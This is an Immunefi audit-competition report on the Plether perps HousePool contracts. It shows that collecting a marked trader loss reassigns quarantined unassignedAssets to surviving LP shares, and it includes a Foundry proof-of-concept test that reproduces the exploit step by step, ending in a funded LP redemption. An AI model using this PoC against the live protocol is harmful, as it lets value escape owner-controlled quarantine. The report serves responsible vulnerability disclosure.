# \#98994 [SC-Medium] Collecting a marked trader loss transfers quarantined assets to existing LP shares

**Submitted on Nov 11th 2026 at 11:08:49 UTC by @thimthor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98994
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Relevant Context

`HousePool.unassignedAssets` holds recognized pool value without an LP claimant. The owner can allocate it only through `assignUnassignedAssets()`, which mints matching tranche shares. The function expressly prevents existing LPs from implicitly receiving that value.

Terminal NAV already includes collectible trader losses, capped by each losing trader's pledged collateral and nettable claim. Collection turns that receivable into pool cash. It does not create an equal amount of new LP value. For carry collected from pledged margin, `packages/perps/ACCOUNTING_SPEC.md` explicitly says that the same pledge must not count once as a marked price-loss receivable and again as collected revenue. Liquidation of pledged margin has the same receivable-to-cash effect.

## Finding Description

`TerminalNavBookV2._engineCurveInput()` includes pledged assets in the marked receivable cap (`packages/perps/src/TerminalNavBookV2.sol`):

```solidity
uint256 candidateCapAssetAtoms =
@>  clearinghouse.pnlPledgeAssets(account) + engine.traderClaimBalanceAssets(account);
```

On liquidation, `CfdEngineSettlementSidecar` transfers seized collateral to the pool and records the **gross** seized amount plus action charge as `Revenue` (`packages/perps/src/CfdEngineSettlementSidecar.sol`). The liquidation call can also collect carry through `CfdEngine`, which records its own cash receipt as revenue:

```solidity
uint256 seizedAssets = _applyLiquidationSettlementPlan(host, delta, keeper);
uint256 cashArrivedRevenueAssets = seizedAssets + delta.actionChargeCollectedAssets;
if (cashArrivedRevenueAssets > 0) {
    IHousePool(host.pool()).recordClaimantInflow(
@>      cashArrivedRevenueAssets,
        IHousePool.ClaimantInflowKind.Revenue,
        IHousePool.ClaimantInflowCashMode.CashArrived
    );
}
```

If both stored tranche principals are zero, `HousePool.recordClaimantInflow()` queues that gross amount in `pendingTradingRevenueAssets`. At the next reconciliation, `HousePoolReconcilePlanLib.planReconcile()` subtracts the pending amount from distributable terminal equity **before** capping `unassignedAssets`:

```solidity
if (pendingBucketAssets > 0) {
@>  snapshot.distributable = snapshot.distributable > pendingBucketAssets
        ? snapshot.distributable - pendingBucketAssets : 0;
}
@> plan.state.unassignedAssets = state.unassignedAssets > snapshot.distributable
    ? snapshot.distributable : state.unassignedAssets;
```

Suppose `R` of the collected cash merely replaces a marked receivable and `F` is genuine new revenue. Terminal equity rises by `F`, but the pending bucket rises by `R + F`. The subtraction reduces `unassignedAssets` by `R`; the pending-revenue pass assigns `R + F` to the surviving shares. Total value is conserved, but `R` changes owners without the required assignment or matching share mint. Unlike disclosed LOW-65, this PoC starts with an already reconciled quarantine and creates no new seed shares. Disclosed MED-12 moves valid LP revenue into quarantine, the opposite direction.

## Impact Explanation

In the PoC, the pool has 1,000,000 USDG of already quarantined recapitalization surplus and surviving Junior shares after a complete principal wipe. The public liquidation call collects 14,284.456331 USDG, including carry, of which 14,134.456331 USDG replaces a marked receivable. The winning trader's close adds some genuine revenue. Before reconciliation, pending revenue totals 14,534.163739 USDG while terminal equity has increased by only 609.521244 USDG. Reconciliation removes the 13,924.642495 USDG difference from `unassignedAssets`, and a public LP claims 14,531.710825 USDG through a funded vault redemption.

That 13,924.642495 USDG can no longer be allocated through the owner-only assignment path. The demonstrated damage is to protocol control of quarantined assets, not theft of an existing LP's principal. This is a Medium protocol-griefing impact under the [competition rules](https://immunefi.com/audit-competition/plether/scope/).

## Recommendation

Account for the full settlement-token receipt as cash, but grant claimant revenue only for the increase in terminal LP equity after the marked curve and pledge cap change. Cash that replaces an existing receivable must leave `unassignedAssets` unchanged. Add a regression case with a previously reconciled quarantine, zero stored tranche principal, surviving shares, a pledge-capped marked loss, and a funded redemption.


## Proof of Concept

## Proof of Concept

Add the following test file to `packages/perps/test/perps/accounting/waterfall/MarkedReceivableCollectionReassignsUnassignedAssets.t.sol` in a fresh checkout of the competition commit. It uses the existing `BasePerpTest` fixture's USDG and Pyth mocks and changes no in-scope contract.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

contract MarkedReceivableCollectionReassignsUnassignedAssetsTest is BasePerpTest {

    struct ProofAmounts {
        uint256 navBeforeCollection;
        uint256 collectedCash;
        uint256 genuineLiquidationRevenue;
        uint256 neutralReceivableCollection;
        uint256 grossPendingRevenue;
        uint256 navBeforeHarmfulReconcile;
        uint256 expectedQuarantineConsumption;
        uint256 quarantineConsumed;
    }

    address internal constant LP = address(0xA11CE);
    address internal constant PROGRESS_LP = address(0xD00D);
    address internal constant WINNER = address(0xB0B);
    address internal constant LOSER = address(0xCA11);

    uint256 internal constant UNASSIGNED = 1_000_000e6;
    uint256 internal constant ENTRY_PRICE = 1e8;
    uint256 internal constant PUBLIC_LP_DEPOSIT = 10_000e6 + 5_118;
    uint256 internal constant WINNER_LOTS = 5_000;
    uint256 internal constant LOSER_LOTS = 3_000;
    uint256 internal constant LOT_SIZE = 100e18;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8_000);
    }

    function test_MarkedReceivableCollectionReassignsQuarantinedAssets() public {
        // A public LP supplies the only redeemable shares. The one-USDG seed shares are permanently locked.
        _fundJunior(LP, PUBLIC_LP_DEPOSIT);
        _fundJunior(PROGRESS_LP, 1e6);

        // Governance performs the documented non-dilutive recapitalization. Since Senior is not impaired,
        // the full amount has no claimant and reconciliation must quarantine it as unassignedAssets.
        uint256 firstRefundId = _requestAllSharesAfterCooldown(PROGRESS_LP);
        settlementToken.mint(address(this), UNASSIGNED);
        settlementToken.approve(address(engine), UNASSIGNED);
        engine.recapitalizePool(UNASSIGNED);
        vm.warp(juniorVault.depositEpochStart(firstRefundId));
        _settleThroughPublicRouter(ENTRY_PRICE);

        assertEq(pool.unassignedAssets(), UNASSIGNED, "recapitalization surplus must start independently quarantined");
        assertEq(pool.pendingRecapitalizationAssets(), 0, "the recapitalization bucket must be settled");

        // Queue all public LP shares before opening positions. At zero principal they quote to zero, so returning them
        // supplies the queue progress required for a permissionless settlement pass to persist reconciliation.
        uint256 wipeRefundId = _requestAllSharesAfterCooldown(LP);
        vm.warp(juniorVault.depositEpochStart(wipeRefundId));

        _fundTrader(WINNER, 100_000e6);
        _fundTrader(LOSER, 20_000e6);
        _openThroughPublicRouter(LOSER, CfdTypes.Side.LONG, LOSER_LOTS * LOT_SIZE, 15_000e6, ENTRY_PRICE);
        _openThroughPublicRouter(WINNER, CfdTypes.Side.SHORT, WINNER_LOTS * LOT_SIZE, 50_000e6, ENTRY_PRICE);

        // The two-thousand-lot net exposure lets an ordinary 4%-6% oracle move wipe the public LP principal while
        // the independently funded one-million-USDG quarantine remains. Pick the exact atom-level mark from live cash.
        _ensureLaterOracleTime();
        uint256 claimedValue = _terminalEquity() - UNASSIGNED;
        uint256 losingPledge = clearinghouse.pnlPledgeAssets(LOSER);
        uint256 cappedLossNumerator = claimedValue + losingPledge;
        assertEq(cappedLossNumerator % WINNER_LOTS, 0, "test setup must admit an exact zero-principal mark");
        uint256 wipePrice = ENTRY_PRICE + cappedLossNumerator / WINNER_LOTS;
        assertGt(wipePrice, 1.04e8, "the wipe must require more than a four-percent index move");
        assertLt(wipePrice, 1.06e8, "the wipe must require less than a six-percent index move");

        _updateMarkThroughPublicRouter(wipePrice);
        assertEq(_terminalEquity(), UNASSIGNED, "marked winner and loser must leave only quarantined equity");

        _settleThroughPublicRouter(wipePrice);
        assertEq(pool.seniorPrincipal() + pool.juniorPrincipal(), 0, "both stored tranche principals must be zero");
        assertEq(pool.unassignedAssets(), UNASSIGNED, "the wipe must not consume the independent quarantine");
        assertGt(
            juniorVault.refundableRedeemRequest(wipeRefundId, LP), 0, "the zero-value redemption must be refundable"
        );
        vm.prank(LP);
        juniorVault.claimRedeemRefund(wipeRefundId, LP, LP);
        assertGt(juniorVault.balanceOf(LP), 0, "the public LP shares must survive the wipe");

        // Queue the surviving public shares again. This ordinary matured request supplies the LP-epoch progress that
        // the later public settlement requires and lets the test prove a funded, claimable cash exit in the same pass.
        uint256 harmfulReconcileRequestId = _requestAllSharesAfterCooldown(LP);
        vm.warp(juniorVault.depositEpochStart(harmfulReconcileRequestId));
        _updateMarkThroughPublicRouter(wipePrice);
        ProofAmounts memory proof;

        // Liquidating the under-margined losing long transfers its pledged price loss into HousePool. Removing the
        // marked receivable offsets almost all of that cash. Only the pool's liquidation-fee share increases NAV.
        proof.navBeforeCollection = _terminalEquity();
        uint256 poolCashBeforeCollection = pool.totalAssets();
        router.executeLiquidation(LOSER, _publicOracleUpdateData(wipePrice));
        proof.collectedCash = pool.totalAssets() - poolCashBeforeCollection;
        uint256 navAfterCollection = _terminalEquity();
        proof.genuineLiquidationRevenue = navAfterCollection - proof.navBeforeCollection;
        proof.neutralReceivableCollection = proof.collectedCash - proof.genuineLiquidationRevenue;

        assertGt(proof.collectedCash, 0, "the real liquidation must collect the pledged price loss");
        emit log_named_decimal_uint("liquidation cash collected", proof.collectedCash, 6);
        emit log_named_decimal_uint("genuine liquidation revenue", proof.genuineLiquidationRevenue, 6);
        emit log_named_decimal_uint(
            "cash that only replaces the marked receivable", proof.neutralReceivableCollection, 6
        );
        assertGt(
            proof.neutralReceivableCollection,
            proof.collectedCash * 98 / 100,
            "nearly all collected cash must merely replace the marked receivable"
        );
        assertEq(
            pool.pendingTradingRevenueAssets(),
            proof.collectedCash,
            "the zero-principal branch queues both the neutral collection and real fee"
        );

        // Close the winning position to release the directional-liability reserve. Preserve the isolated liquidation
        // measurement above, then account for any close revenue separately in the gross bucket settled below.
        _closeThroughPublicRouter(WINNER, CfdTypes.Side.SHORT, WINNER_LOTS * LOT_SIZE, wipePrice);
        proof.grossPendingRevenue = pool.pendingTradingRevenueAssets();
        assertGe(
            proof.grossPendingRevenue,
            proof.collectedCash,
            "the winner close must preserve the isolated liquidation inflow"
        );

        // A public Router settlement applies all genuine NAV growth to the claimant bucket, then takes the remainder
        // from the independently quarantined balance. That remainder is the double-attributed amount.
        proof.navBeforeHarmfulReconcile = _terminalEquity();
        uint256 totalGenuineRevenue = proof.navBeforeHarmfulReconcile - proof.navBeforeCollection;
        proof.expectedQuarantineConsumption = proof.grossPendingRevenue - totalGenuineRevenue;
        emit log_named_decimal_uint("gross pending claimant revenue", proof.grossPendingRevenue, 6);
        emit log_named_decimal_uint("total genuine NAV growth", totalGenuineRevenue, 6);
        uint256 unassignedBeforeHarmfulReconcile = pool.unassignedAssets();
        assertGt(
            proof.expectedQuarantineConsumption,
            proof.neutralReceivableCollection * 98 / 100,
            "the later close must not hide the marked-receivable accounting error"
        );
        _settleThroughPublicRouter(wipePrice);
        proof.quarantineConsumed = unassignedBeforeHarmfulReconcile - pool.unassignedAssets();
        assertEq(
            proof.quarantineConsumed,
            proof.expectedQuarantineConsumption,
            "gross pending revenue minus genuine NAV growth must come from quarantine"
        );
        emit log_named_decimal_uint("quarantined assets reassigned to LP claims", proof.quarantineConsumed, 6);
        assertGt(pool.seniorPrincipal() + pool.juniorPrincipal(), 0, "surviving seed shares must receive principal");
        assertEq(pool.pendingTradingRevenueAssets(), 0, "the harmful settlement must consume the liquidation bucket");

        uint256 claimableShares = juniorVault.claimableRedeemRequest(harmfulReconcileRequestId, LP);
        uint256 lpBalanceBefore = settlementToken.balanceOf(LP);
        vm.prank(LP);
        uint256 assetsClaimed =
            juniorVault.claimRedeem(harmfulReconcileRequestId, claimableShares, LP, LP);

        assertGe(
            assetsClaimed,
            proof.quarantineConsumed * 99 / 100,
            "the non-seed LP must receive nearly all reclassified quarantine as real USDG"
        );
        emit log_named_decimal_uint("USDG paid to the public LP", assetsClaimed, 6);
        assertEq(
            _terminalEquity() + assetsClaimed,
            proof.navBeforeHarmfulReconcile,
            "settlement must only move the reclassified value into the LP's funded redemption"
        );
        assertEq(settlementToken.balanceOf(LP) - lpBalanceBefore, assetsClaimed, "the vault must transfer the funded USDG");
        assertEq(pool.pendingTradingRevenueAssets(), 0, "reconciliation must consume the queued revenue");
    }

    function _requestAllSharesAfterCooldown(
        address holder
    ) internal returns (uint256 requestId) {
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);
        uint256 shares = juniorVault.balanceOf(holder);
        vm.prank(holder);
        requestId = juniorVault.requestRedeem(shares, holder, holder);
    }

    function _openThroughPublicRouter(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price
    ) internal {
        uint64 orderId = _commitBoundedOrder(account, side, size, margin, price, false);
        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);
        vm.prank(account);
        router.executeOrder(orderId, _publicOracleUpdateData(price));
    }

    function _closeThroughPublicRouter(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 price
    ) internal {
        uint64 orderId = _commitBoundedOrder(account, side, size, 0, price, true);
        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);
        vm.prank(account);
        router.executeOrder(orderId, _publicOracleUpdateData(price));
    }

    function _commitBoundedOrder(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price,
        bool isClose
    ) internal returns (uint64 orderId) {
        uint256 executionWindow = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(account, router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: price,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp + executionWindow),
                executionWindowSeconds: uint32(executionWindow),
                allowedExecutionModes: 1 | 2 | 4,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(account);
        orderId = router.commitOrder(request);
    }

    function _terminalEquity() internal view returns (uint256) {
        ICfdEngineTypes.TerminalNavSnapshot memory snapshot = engine.terminalNavSnapshot();
        int256 signedEquity = int256(pool.totalAssets()) - int256(snapshot.totalTraderClaimsAssets)
            + snapshot.terminalLpPriceDeltaAssets;
        assertGe(signedEquity, 0, "test scenario keeps terminal equity solvent");
        return uint256(signedEquity);
    }

    function _settleThroughPublicRouter(
        uint256 price
    ) internal {
        router.settleLpEpoch(_publicOracleUpdateData(price));
    }

    function _updateMarkThroughPublicRouter(
        uint256 price
    ) internal {
        router.updateMarkPrice(_publicOracleUpdateData(price));
    }

    function _publicOracleUpdateData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        uint256 publishTime = block.timestamp;
        uint256 previousPublishTime = publishTime == 0 ? 0 : publishTime - 1;
        bytes32[] memory feedIds = _basePythFeedIds();
        // Two equal 50% basket legs round an odd price down by one tick. Split the legs by one tick so the
        // production oracle's weighted result equals the exact Engine mark used by this atom-level accounting test.
        uint256 secondPrice = price % 2 == 0 ? price : price + 1;
        MockPyth.FeedUpdate[] memory feedUpdates = new MockPyth.FeedUpdate[](2);
        feedUpdates[0] = MockPyth.FeedUpdate({
            id: feedIds[0],
            price: MockPyth.MockPrice({
                price: int64(int256(price)),
                conf: 0,
                expo: -8,
                publishTime: publishTime,
                prevPublishTime: previousPublishTime
            })
        });
        feedUpdates[1] = MockPyth.FeedUpdate({
            id: feedIds[1],
            price: MockPyth.MockPrice({
                price: int64(int256(secondPrice)),
                conf: 0,
                expo: -8,
                publishTime: publishTime,
                prevPublishTime: previousPublishTime
            })
        });
        updateData = new bytes[](1);
        updateData[0] = abi.encode(feedUpdates);
    }

}
```

Run from the repository root after the normal build:

```bash
forge test --root packages/perps --match-test test_MarkedReceivableCollectionReassignsQuarantinedAssets -vvv
```

Result: one test passed. It logs 14,284.456331 USDG collected on liquidation, 609.521244 USDG of total genuine NAV growth, 13,924.642495 USDG removed from quarantine, and 14,531.710825 USDG paid to the public LP.
